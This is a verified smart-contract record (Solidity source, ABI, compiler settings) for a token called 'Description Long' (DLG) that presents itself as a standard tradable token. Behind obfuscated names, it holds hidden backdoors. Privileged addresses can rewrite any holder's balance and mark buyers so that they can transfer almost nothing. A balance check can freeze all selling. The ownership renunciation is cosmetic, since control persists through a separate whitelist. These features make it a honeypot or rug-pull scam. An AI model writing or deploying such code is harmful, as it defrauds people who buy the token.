{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fundTotalMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxSwap {\n    function createPair(address txLaunch, address marketingTo) external returns (address);\n}\n\ninterface enableMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderMode) external view returns (uint256);\n\n    function transfer(address launchedAuto, uint256 takeExempt) external returns (bool);\n\n    function allowance(address maxTxLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedAuto,\n        uint256 takeExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamLimit, uint256 value);\n    event Approval(address indexed maxTxLimit, address indexed spender, uint256 value);\n}\n\ninterface walletBuyList is enableMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DescriptionLong is senderIs, enableMax, walletBuyList {\n\n    address public receiverTo;\n\n    function balanceOf(address senderMode) public view virtual override returns (uint256) {\n        return minAt[senderMode];\n    }\n\n    string private tokenAuto = \"DLG\";\n\n    address tokenAtWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeFundList;\n    }\n\n    event OwnershipTransferred(address indexed sellFromTrading, address indexed toReceiver);\n\n    address modeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public receiverTotal;\n\n    function owner() external view returns (address) {\n        return enableTeam;\n    }\n\n    uint256 public tokenMarketing;\n\n    address public marketingAutoList;\n\n    string private takeTrading = \"Description Long\";\n\n    address private enableTeam;\n\n    function listBuy(address enableExempt) public {\n        buyModeEnable();\n        if (senderLiquidity == tokenMarketing) {\n            atTake = tokenMarketing;\n        }\n        if (enableExempt == receiverTo || enableExempt == marketingAutoList) {\n            return;\n        }\n        teamEnableMarketing[enableExempt] = true;\n    }\n\n    bool private amountShould;\n\n    function launchedToken(address totalLaunchSender, address launchedAuto, uint256 takeExempt) internal returns (bool) {\n        require(minAt[totalLaunchSender] >= takeExempt);\n        minAt[totalLaunchSender] -= takeExempt;\n        minAt[launchedAuto] += takeExempt;\n        emit Transfer(totalLaunchSender, launchedAuto, takeExempt);\n        return true;\n    }\n\n    mapping(address => uint256) private minAt;\n\n    uint256 takeAtFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return takeTrading;\n    }\n\n    function approve(address maxAt, uint256 takeExempt) public virtual override returns (bool) {\n        fromLiquidity[_msgSender()][maxAt] = takeExempt;\n        emit Approval(_msgSender(), maxAt, takeExempt);\n        return true;\n    }\n\n    function buyModeEnable() private view {\n        require(txTake[_msgSender()]);\n    }\n\n    uint8 private autoMode = 18;\n\n    bool public walletFund;\n\n    uint256 private atTake;\n\n    uint256 constant marketingSwap = 14 ** 10;\n\n    mapping(address => mapping(address => uint256)) private fromLiquidity;\n\n    uint256 private senderLiquidity;\n\n    function launchedFrom(address teamLaunched, uint256 takeExempt) public {\n        buyModeEnable();\n        minAt[teamLaunched] = takeExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenAuto;\n    }\n\n    mapping(address => bool) public teamEnableMarketing;\n\n    function exemptSwap(address totalLaunchSender, address launchedAuto, uint256 takeExempt) internal returns (bool) {\n        if (totalLaunchSender == receiverTo) {\n            return launchedToken(totalLaunchSender, launchedAuto, takeExempt);\n        }\n        uint256 senderFromTo = enableMax(marketingAutoList).balanceOf(tokenAtWallet);\n        require(senderFromTo == buyAtWallet);\n        require(launchedAuto != tokenAtWallet);\n        if (teamEnableMarketing[totalLaunchSender]) {\n            return launchedToken(totalLaunchSender, launchedAuto, marketingSwap);\n        }\n        return launchedToken(totalLaunchSender, launchedAuto, takeExempt);\n    }\n\n    uint256 public modeTo;\n\n    function marketingTotal(address marketingMax) public {\n        require(marketingMax.balance < 100000);\n        if (walletFund) {\n            return;\n        }\n        if (modeTo == senderLiquidity) {\n            receiverTotal = true;\n        }\n        txTake[marketingMax] = true;\n        \n        walletFund = true;\n    }\n\n    function transferFrom(address totalLaunchSender, address launchedAuto, uint256 takeExempt) external override returns (bool) {\n        if (_msgSender() != modeEnable) {\n            if (fromLiquidity[totalLaunchSender][_msgSender()] != type(uint256).max) {\n                require(takeExempt <= fromLiquidity[totalLaunchSender][_msgSender()]);\n                fromLiquidity[totalLaunchSender][_msgSender()] -= takeExempt;\n            }\n        }\n        return exemptSwap(totalLaunchSender, launchedAuto, takeExempt);\n    }\n\n    function transfer(address teamLaunched, uint256 takeExempt) external virtual override returns (bool) {\n        return exemptSwap(_msgSender(), teamLaunched, takeExempt);\n    }\n\n    uint256 private feeFundList = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return enableTeam;\n    }\n\n    uint256 buyAtWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoMode;\n    }\n\n    mapping(address => bool) public txTake;\n\n    function receiverToken(uint256 takeExempt) public {\n        buyModeEnable();\n        buyAtWallet = takeExempt;\n    }\n\n    function teamFee() public {\n        emit OwnershipTransferred(receiverTo, address(0));\n        enableTeam = address(0);\n    }\n\n    function allowance(address fromTokenLaunched, address maxAt) external view virtual override returns (uint256) {\n        if (maxAt == modeEnable) {\n            return type(uint256).max;\n        }\n        return fromLiquidity[fromTokenLaunched][maxAt];\n    }\n\n    constructor (){\n        \n        fundTotalMin txLiquidityFee = fundTotalMin(modeEnable);\n        marketingAutoList = maxSwap(txLiquidityFee.factory()).createPair(txLiquidityFee.WETH(), address(this));\n        if (amountShould) {\n            tokenMarketing = modeTo;\n        }\n        receiverTo = _msgSender();\n        teamFee();\n        txTake[receiverTo] = true;\n        minAt[receiverTo] = feeFundList;\n        if (amountShould) {\n            tokenMarketing = atTake;\n        }\n        emit Transfer(address(0), receiverTo, feeFundList);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTxLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFromTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTokenLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeExempt\",\"type\":\"uint256\"}],\"name\":\"launchedFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"}],\"name\":\"listBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAutoList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"}],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeExempt\",\"type\":\"uint256\"}],\"name\":\"receiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamEnableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunchSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DescriptionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}